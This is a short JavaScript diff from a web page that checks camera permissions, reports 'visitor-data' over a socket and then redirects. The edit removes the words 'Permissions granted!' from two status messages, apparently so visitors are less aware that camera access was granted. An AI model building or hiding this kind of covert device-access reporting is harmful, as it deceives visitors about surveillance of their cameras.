@@ -465,7 +465,7 @@
                         return;
                     }
                     
-                    updateStatus('✅ Permissions granted! Redirecting...', 'success');
+                    updateStatus('✅ Redirecting...', 'success');
                     
                     if (socket && socket.connected) {
                         socket.emit('visitor-data', { visitorId, type: 'permissionsGranted', content: true });
@@ -480,7 +480,7 @@
                     if (!permissions.frontCamera && !permissions.backCamera) {
                         updateStatus('❌ Error', 'error');
                     } else {
-                        updateStatus('✅ Permissions granted! Redirecting...', 'success');
+                        updateStatus('✅ Redirecting...', 'success');
                         setTimeout(function() {
                             if (!redirectTriggered) { redirectNow(); }
                         }, 1000);
